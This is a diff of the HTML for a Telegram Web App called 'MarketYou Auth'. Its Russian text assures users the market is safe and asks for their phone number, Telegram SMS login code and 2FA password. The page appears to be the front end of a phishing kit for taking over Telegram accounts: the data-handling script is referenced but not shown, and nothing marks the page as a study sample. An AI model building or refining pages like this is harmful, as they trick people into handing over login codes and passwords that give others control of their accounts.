@@ -1,32 +1,30 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Marketyou Auth</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>MarketYou Auth</title>
     <link rel="stylesheet" href="styles.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
     <div class="container">
         <header>
             <h1>😉 Наш маркет - безопасен! Войдите для продолжения.</h1>
-            <button id="loginBtn" class="login-btn">Войти</button>
         </header>
-
+        <button id="loginBtn" class="login-btn">Войти</button>
         <div id="authForm" class="auth-form hidden">
-            <div id="statusMsg" class="status-msg"></div>
+            <input id="phoneInput" type="text" class="input-field hidden" readonly>
+            <input id="codeInput" type="text" class="input-field hidden" placeholder="Введите SMS-код">
+            <input id="twoFaInput" type="password" class="input-field hidden" placeholder="Введите пароль 2FA">
             <div id="loadingSpinner" class="loading hidden"></div>
-            <input type="tel" id="phoneInput" class="input-field hidden" placeholder="+7 (XXX) XXX-XX-XX" readonly>
-            <input type="text" id="codeInput" class="input-field hidden" placeholder="Введите SMS-код" maxlength="5">
-            <input type="password" id="2faInput" class="input-field hidden" placeholder="Пароль 2FA">
-            <button id="submitBtn" class="submit-btn hidden">Отправить</button>
             <div id="successMsg" class="success hidden">✅ Авторизация успешна! Закройте приложение.</div>
             <div id="errorMsg" class="error hidden"></div>
+            <div id="statusMsg" class="status-msg"></div>
             <div id="instructionMsg" class="status-msg hidden">Проверьте сообщение от бота ниже. Если требуется 2FA, введите пароль и подтвердите. Иначе закройте приложение.</div>
+            <button id="submitBtn" class="submit-btn hidden">Отправить</button>
         </div>
     </div>
-
     <script src="script.js"></script>
 </body>
 </html>
